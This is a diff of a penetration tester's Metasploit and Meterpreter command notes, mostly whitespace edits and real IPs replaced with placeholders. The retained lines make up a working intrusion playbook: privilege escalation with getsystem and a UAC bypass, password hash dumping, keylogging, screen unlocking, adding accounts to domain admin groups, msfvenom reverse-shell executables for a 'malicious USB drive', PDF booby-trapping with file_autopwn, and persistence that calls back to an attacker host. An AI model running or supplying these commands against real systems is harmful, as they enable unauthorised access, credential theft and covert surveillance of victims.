@@ -38,7 +38,7 @@ msf > set RHOST <targetIP>
 msf > exploit
 ==========================
 
-Below here is NOT yet organized.
+Below here are OLD notes that have NOT been organized.
 
 meterpreter > impersonate_token DOMAIN\\Administrator
 [+] Delegation token available
@@ -91,16 +91,16 @@ run migrate                                       Create a new process and migra
 ps                                                Show running processes.
 sysinfo                                           Show host name and OS.
 getuid                                            Show current privileges.
-	if not NT AUTHORITY\SYSTEM
-	use priv                                  Escalate privileges.
-	getsystem
-	getuid                                    Privileges should now be NT AUTHORITY\SYSTEM
+     if not NT AUTHORITY\SYSTEM
+     use priv                                     Escalate privileges.
+     getsystem
+     getuid                                       Privileges should now be NT AUTHORITY\SYSTEM
 screenshot                                        Take a photo of the desktop. 
 hashdump                                          Dump the password hashed.
 ipconfig                                          Look for dual-homed connections
-	if dual-homed
-	run autoroute -s <new CIDR range, 192.168.1.0/24>
-	run autoroute -p                          Print routing table.
+     if dual-homed
+     run autoroute -s <new CIDR range>
+     run autoroute -p                             Print routing table.
 route
 
 use incognito
@@ -111,25 +111,25 @@ add_group_user "Enterprise Admins" accuvant -h <target IP>
 add_group_user "Remote Access Users" accuvant -h <target IP>
 
 (Open a new tab in Konsole)
-	cp /pentest/windows-binaries/passwd-attack/fgdump.exe /tmp/
-	cp /pentest/windows-binaries/passwd-attack/cachedump.exe /tmp/
+     cp /pentest/windows-binaries/passwd-attack/fgdump.exe /tmp/
+     cp /pentest/windows-binaries/passwd-attack/cachedump.exe /tmp/
 (Go back to the Metasploit tab)
-	upload /tmp/fgdump.exe c:\\	
+     upload /tmp/fgdump.exe c:\\	
 Note: If the AV recognizes the file, your meterpreter session will end.
 Re-exploit the box and upload cachedump.exe.
 If upload is successful
-	shell                                     Drop into a Windows shell.
-	cd \                                      Change to root directory.
+     shell                                        Drop into a Windows shell.
+     cd \                                         Change to root directory.
 
 idletime                                    
-    	if time < 5 min
-       keyscan_start                              Start the keylogger.
-       keyscan_stop                               Stop the keylogger.
-       keyscan_dump                               Dump keystrokes.
+     if time < 5 min
+     keyscan_start                                Start the keylogger.
+     keyscan_stop                                 Stop the keylogger.
+     keyscan_dump                                 Dump keystrokes.
 
 run vnc
-    	if the screen is locked exit VNC                               
-        meterpreter > run screen_unlock                    
+     if the screen is locked exit VNC                               
+     meterpreter > run screen_unlock                    
 meterpreter > run get_application_list
 meterpreter > run winenum
 
@@ -149,7 +149,7 @@ meterpreter > exit
 
 =====
 
-Malicious USB Key
+Malicious USB drive
 
 msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
 msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=attackerIP LPORT=443 > evil.exe
@@ -239,7 +239,7 @@ set LHOST rmccurdy.com
 set LPORT 21
 set ExitOnSession false
 # set AutoRunScript pathto script you want to autorun after exploit is run 
-set AutoRunScript persistence -r 75.139.158.51 -p 21 -A -X -i 30 
+set AutoRunScript persistence -r <targetIP> -p 21 -A -X -i 30 
 
 exploit -j -z
 
@@ -248,7 +248,7 @@ rm -Rf /tmp/1
 mkdir /tmp/1 
 rm -Rf ~/.msf3
 
-wget -O /tmp/file3.pdf https://www1.nga.mil/Newsroom/PressReleases/Press%20Releases/nga10_02.pdf
+wget www.target.com/test.pdf
 
 msfconsole
 
@@ -259,7 +259,7 @@ setg LPORT 21
 setg SRVPORT 21
 setg LPORT_WIN32 21
 
-setg INFILENAME /tmp/file3.pdf
+setg INFILENAME test.pdf
 
 use auxiliary/server/file_autopwn
 
@@ -269,14 +269,14 @@ set URIPATH /msf
 set SSL true
 set ExitOnSession false
 set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript persistence -r 75.139.158.51 -p 21 -A -X -i 30
+set AutoRunScript persistence -r <targetIP> -p 21 -A -X -i 30
 run
 
 # shows all the scripts
 run [tab]
 
 # persistence! broken ...if you use DNS name ..
-run persistence -r 75.139.158.51 -p 21 -A -X -i 30
+run persistence -r <targetIP> -p 21 -A -X -i 30
 
 run get_pidgin_creds
 
@@ -438,5 +438,5 @@ keyscan_dump
 keyscan_stop
 
 getsystem
-	if this fails
+     if this fails
 run post/windows/escalate/bypassuac
